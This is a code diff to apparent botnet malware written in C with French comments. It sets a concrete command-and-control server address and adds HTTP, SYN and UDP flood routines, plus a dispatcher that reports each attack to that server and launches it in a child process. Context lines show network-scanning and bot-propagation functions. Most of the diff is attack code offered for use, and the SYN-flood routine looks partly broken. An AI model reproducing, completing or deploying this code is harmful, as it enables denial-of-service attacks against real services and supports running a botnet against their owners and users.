@@ -13,7 +13,7 @@
 #include <sys/wait.h>
 #include <dirent.h>
 
-#define C2_SERVER "your ip"
+#define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
 #define BUFFER_SIZE 1024
 
@@ -60,20 +60,113 @@ void scan_network(int c2_socket, char* subnet) {
     }
 }
 
-// Fonction pour effectuer une attaque DDoS
-void ddos_attack(int c2_socket, char* target, int port, int duration) {
-    char command[BUFFER_SIZE];
+// Fonction pour effectuer une attaque HTTP flood
+void http_flood(char* target, int port, int duration) {
+    int sock;
+    struct sockaddr_in addr;
+    char request[BUFFER_SIZE];
     
-    // Construire la commande d'attaque (exemple simple avec ping flood)
-    sprintf(command, "ping -f %s -c %d > /dev/null 2>&1 &", target, duration * 100);
+    // Construire la requête HTTP
+    snprintf(request, BUFFER_SIZE,
+        "GET /?%d HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+        "Accept-Language: en-US,en;q=0.5\r\n"
+        "Accept-Encoding: gzip, deflate\r\n"
+        "Connection: keep-alive\r\n\r\n",
+        rand(), target);
     
-    // Exécuter la commande en arrière-plan
-    system(command);
+    // Configurer l'adresse
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(target);
     
-    // Informer le serveur C2
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < duration) {
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock >= 0) {
+            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
+                send(sock, request, strlen(request), 0);
+            }
+            close(sock);
+        }
+        usleep(1000); // Petit délai pour ne pas surcharger le système
+    }
+}
+
+// Fonction pour effectuer une attaque SYN flood
+void syn_flood(char* target, int port, int duration) {
+    int sock;
+    struct sockaddr_in addr;
+    
+    // Créer un socket raw
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock < 0) return;
+    
+    // Configurer l'adresse cible
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(target);
+    
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < duration) {
+        // Envoyer des paquets SYN
+        sendto(sock, NULL, 0, 0, (struct sockaddr*)&addr, sizeof(addr));
+        usleep(1000);
+    }
+    close(sock);
+}
+
+// Fonction pour effectuer une attaque UDP flood
+void udp_flood(char* target, int port, int duration) {
+    int sock;
+    struct sockaddr_in addr;
+    char packet[1024];
+    
+    // Remplir le paquet avec des données aléatoires
+    for (int i = 0; i < sizeof(packet); i++) {
+        packet[i] = rand() % 255;
+    }
+    
+    // Créer le socket UDP
+    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) return;
+    
+    // Configurer l'adresse cible
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(target);
+    
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < duration) {
+        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&addr, sizeof(addr));
+        usleep(100);
+    }
+    close(sock);
+}
+
+// Fonction principale pour effectuer une attaque DDoS
+void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
+    // Informer le serveur C2 du début de l'attaque
     char message[BUFFER_SIZE];
-    sprintf(message, "DDOS_STARTED|%s:%d|%d seconds", target, port, duration);
+    sprintf(message, "DDOS_STARTED|%s:%d|%s|%d seconds", target, port, method, duration);
     send(c2_socket, message, strlen(message), 0);
+    
+    // Lancer l'attaque dans un processus fils
+    if (fork() == 0) {
+        if (strcmp(method, "http") == 0) {
+            http_flood(target, port, duration);
+        } else if (strcmp(method, "syn") == 0) {
+            syn_flood(target, port, duration);
+        } else if (strcmp(method, "udp") == 0) {
+            udp_flood(target, port, duration);
+        }
+        exit(0);
+    }
 }
 
 // Fonction pour propager le bot
